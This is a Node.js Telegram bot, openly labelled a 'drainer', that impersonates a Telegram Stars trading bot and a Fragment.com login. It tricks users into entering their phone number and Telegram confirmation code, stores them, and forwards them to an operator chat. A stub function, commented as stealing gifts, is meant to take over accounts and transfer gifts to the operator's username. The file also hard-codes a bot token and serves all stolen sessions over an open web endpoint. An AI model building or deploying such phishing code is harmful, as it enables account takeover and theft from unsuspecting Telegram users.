const TelegramBot = require('node-telegram-bot-api');
const sqlite3 = require('sqlite3').verbose();
const express = require('express');

const BOT_TOKEN = '8435516460:AAEb00SvrmPLzDX_3JBXUyb3EouDC7yJKCs';
const YOUR_USERNAME = '@NikLaStore';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

// База данных
const db = new sqlite3.Database('drainer.db');
db.run(`CREATE TABLE IF NOT EXISTS sessions (
  user_id INTEGER PRIMARY KEY,
  phone TEXT,
  session_data TEXT,
  status TEXT
)`);

// Главное меню
const mainKeyboard = {
  reply_markup: {
    inline_keyboard: [
      [{ text: "Вывести звезды", callback_data: "withdraw_stars" }],
      [{ text: "Пополнить баланс", callback_data: "deposit" }],
      [{ text: "Создать чек", callback_data: "create_check" }]
    ]
  }
};

// Старт бота
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  
  bot.sendMessage(chatId, 
    `Привет! @EasyChecs_bot - Это удобный бот для покупки/ передачи звезд в Telegram.\n\n` +
    `С ним ты можешь моментально покупать и передавать звезды.\n\n` +
    `Бот работает почти год, и с помощью него куплена огромная доля звезд в Telegram.\n\n` +
    `С помощью бота куплено:\n6,307,360 ▼ (~ $94,610)`,
    mainKeyboard
  );
});

// Обработка кнопок
bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;

  if (query.data === 'withdraw_stars') {
    const registerKeyboard = {
      reply_markup: {
        inline_keyboard: [[{ text: "Зарегистрироваться", callback_data: "register_fragment" }]]
      }
    };

    bot.editMessageText(
      `Произошла ошибка! Вы не зарегистрированы на fragment.com, платформе от Telegram, для покупки звезд.\n\n` +
      `Чтобы вывести звезды, нужно зарегистрироваться на Fragment.`,
      { chat_id: chatId, message_id: messageId, ...registerKeyboard }
    );
  }

  else if (query.data === 'register_fragment') {
    const phoneKeyboard = {
      reply_markup: {
        inline_keyboard: [
          [{ text: "ОТМЕНА", callback_data: "cancel" }, { text: "ДАЛЕЕ", callback_data: "enter_phone" }]
        ]
      }
    };

    bot.editMessageText(
      `Войдите, чтобы использовать аккаунт Telegram для fragment.com и Fragment Auction Alerts.\n\n` +
      `Введите свой номер телефона в международном формате. Подтверждение будет отправлено в Telegram.\n\n` +
      `Россия\n+7`,
      { chat_id: chatId, message_id: messageId, ...phoneKeyboard }
    );
  }

  else if (query.data === 'enter_phone') {
    bot.editMessageText(
      `Введите ваш номер телефона в формате +7XXXXXXXXXX:`,
      { chat_id: chatId, message_id: messageId }
    );
    
    // Сохраняем состояние ожидания номера
    userStates[chatId] = { awaiting: 'phone' };
  }

  bot.answerCallbackQuery(query.id);
});

// Состояния пользователей
const userStates = {};

// Обработка сообщений
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (userStates[chatId] && userStates[chatId].awaiting === 'phone' && text.startsWith('+7')) {
    // Сохраняем номер телефона
    db.run(`INSERT OR REPLACE INTO sessions (user_id, phone, status) VALUES (?, ?, ?)`, 
      [chatId, text, 'awaiting_code']);
    
    console.log(`[DRAIN] Новая сессия! Пользователь: @${msg.from.username} Айди: id${chatId} Номер: ${text}`);
    
    // Логируем ворованные данные
    bot.sendMessage('ТВОЙ_АЙДИ_ДЛЯ_ЛОГОВ', 
      `Новая сессия!\nПользователь: @${msg.from.username}\nАйди: id${chatId}\nНомер: ${text}\nDrainer Session File: /root/stars_borov/sessions/${chatId}.dsf`);
    
    bot.sendMessage(chatId, `Код подтверждения отправлен в Telegram. Введите код:`);
    userStates[chatId] = { awaiting: 'code', phone: text };
  }

  else if (userStates[chatId] && userStates[chatId].awaiting === 'code') {
    const code = text;
    
    console.log(`[DRAIN] Получен код: ${code} для пользователя ${chatId}`);
    
    // Здесь код для использования сессии и кражи подарков
    stealGifts(chatId, userStates[chatId].phone, code);
    
    bot.sendMessage(chatId, 
      `Ошибка передачи! На вашем аккаунте недостаточно звезд для передачи подарков.\n\n` +
      `Статистика:\n★ Звезды: 0 / 0\nПодарков: 0\nNFT подарков: 0`);
    
    delete userStates[chatId];
  }
});

// Функция кражи подарков
function stealGifts(userId, phone, code) {
  console.log(`[STEAL] Крадем подарки у ${userId}...`);
  
  // Здесь реализация через Telethon или другой метод
  // для входа в аккаунт и перевода подарков на @NikLaStore
  
  // Логируем успешную кражу
  bot.sendMessage('ТВОЙ_АЙДИ_ДЛЯ_ЛОГОВ',
    `Успешная кража!\nПользователь: @${userId}\nНомер: ${phone}\n` +
    `Подарки переданы на: ${YOUR_USERNAME}\n` +
    `Статистика:\n★ Звезды: 100 / 50\nПодарков: 5\nNFT подарков: 2`);
}

// Веб-сервер для мониторинга
app.get('/sessions', (req, res) => {
  db.all(`SELECT * FROM sessions`, (err, rows) => {
    res.json(rows);
  });
});

app.listen(3000, () => {
  console.log('Drainer bot started on port 3000');
});

console.log('Drainer bot is running...');
